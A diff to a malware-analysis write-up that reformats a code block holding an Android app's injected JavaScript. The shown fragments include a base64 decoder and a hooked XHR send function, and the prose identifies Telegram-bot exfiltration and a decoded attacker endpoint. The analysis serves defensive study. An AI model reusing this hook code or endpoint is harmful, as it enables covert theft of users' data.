@@ -140,7 +140,7 @@ All the strings within those files are now decoded and we can analyse the applic
 
 In the `myodyrurjpvobweyo` function there was a intresting JScode :
 ```javascript
-String jsCode = "(function fn_SzP7() {
+(function fn_SzP7() {
     function fn_Kn9S(str) {
         return atob(str);
     }
@@ -236,7 +236,7 @@ String jsCode = "(function fn_SzP7() {
         return originalSend.apply(this, arguments);
     };
 })();
-";
+
 ```
 
 This JS function shows that the application is collecting the data and sending it to the attacker via telegram bots. We can see the telegram bot tokens and the chat ids, that the application is using to sending the data. One more thing to note is this base64 encoded string `aHR0cHM6Ly9zdWJtaXQub3R0Z29vZHMuc2hvcC9wb3N0LnBocA==` which results in `https://submit.ottgoods.shop/post.php`. So this is the endpoint that it is connecting too. Unfortunately it was not reachable... otherwise we could have done further analysis. But we have enough information to conclude the intent of this malware.
